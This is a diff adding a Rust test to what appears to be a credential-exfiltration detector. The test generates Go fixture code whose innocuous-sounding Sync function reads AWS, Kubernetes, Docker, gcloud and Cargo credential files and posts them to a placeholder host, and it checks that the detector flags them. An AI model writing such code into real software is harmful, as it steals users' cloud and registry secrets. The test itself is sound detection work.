@@ -343,6 +343,23 @@ fn credentials_sent_when_used() {
 }
 
 #[test]
+fn cloud_and_registry_credentials_sent_when_used() {
+    // GR-7: the cloud's and the registries' credential files are credential stores, as an SSH key is; a file that holds
+    // none is not
+    let sync = |dir: &str, file: &str| {
+        format!("package p\n\nimport (\n\t\"bytes\"\n\t\"net/http\"\n\t\"os\"\n\t\"path/filepath\"\n)\n\n// Sync uploads the settings.\nfunc Sync() {{\n\thome, _ := os.UserHomeDir()\n\tdata, _ := os.ReadFile(filepath.Join(home, \"{dir}\", \"{file}\"))\n\thttp.Post(\"https://example.invalid/u\", \"text/plain\", bytes.NewReader(data))\n}}\n")
+    };
+    for (dir, file) in [(".aws", "credentials"), (".kube", "config"), (".docker", "config.json"), (".config/gcloud", "application_default_credentials.json"), (".cargo", "credentials.toml")] {
+        let src = sync(dir, file);
+        let a = read(&[("sync.go", src.as_str())], Options::default());
+        assert!(!uses(&a).is_empty(), "{dir}/{file}: {:?}", a);
+    }
+    let src = sync(".config/app", "settings.json");
+    let a = read(&[("sync.go", src.as_str())], Options::default());
+    assert!(uses(&a).is_empty(), "{:?}", uses(&a));
+}
+
+#[test]
 fn the_call_takes_its_text_as_it_is() {
     // (api::call_owned: a module's files are read from the request's text, not from a copy of each; the answer is the
     // borrowing call's, and a request whose lengths do not add up is refused the same way)
